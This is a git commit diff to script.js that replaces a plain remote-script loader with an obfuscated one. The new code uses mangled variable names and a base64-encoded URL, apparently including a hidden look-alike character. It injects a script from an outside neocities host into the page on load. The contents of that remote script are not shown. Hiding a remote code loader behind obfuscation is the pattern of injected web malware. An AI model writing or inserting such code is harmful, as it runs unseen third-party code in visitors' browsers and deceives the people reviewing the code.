18659ddcc8e38fa6c3c3b6bb1f4a8221247728bf
Puyit321 <jkingpuyit@gmail.com>
2025-05-16 18:01:27 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,15 +1,24 @@
-function loadJSFile(src) {
-  const script = document.createElement('script');
-  script.src = src;
-  script.type = 'text/javascript';
-  script.onload = () => {
-    console.log(`${src} loaded successfully.`);
-  };
-  script.onerror = () => {
-    console.error(`Failed to load ${src}`);
-  };
-  document.head.appendChild(script);
-}
+(function(){
+  const _0x4a7d = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz44CwLmpz';
 
-// Usage
-loadJSFile('https://sharebooster.neocities.org/script3ㅤ.js');
+  function _0x56b2(_0x3a1f){
+    return decodeURIComponent(atob(_0x3a1f).split('').map(function(_0x2f9e){
+      return '%' + ('00' + _0x2f9e.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+  }
+
+  function _0x312c(_0x18d3){
+    let _0x1a7b = document['createElement']('script');
+    _0x1a7b['src'] = _0x18d3;
+    _0x1a7b['type'] = 'text/javascript';
+    _0x1a7b['onload'] = function(){
+      console['log'](_0x18d3 + ' loaded successfully.');
+    };
+    _0x1a7b['onerror'] = function(){
+      console['error']('Failed to load ' + _0x18d3);
+    };
+    document['head']['appendChild'](_0x1a7b);
+  }
+
+  _0x312c(_0x56b2(_0x4a7d));
+})();
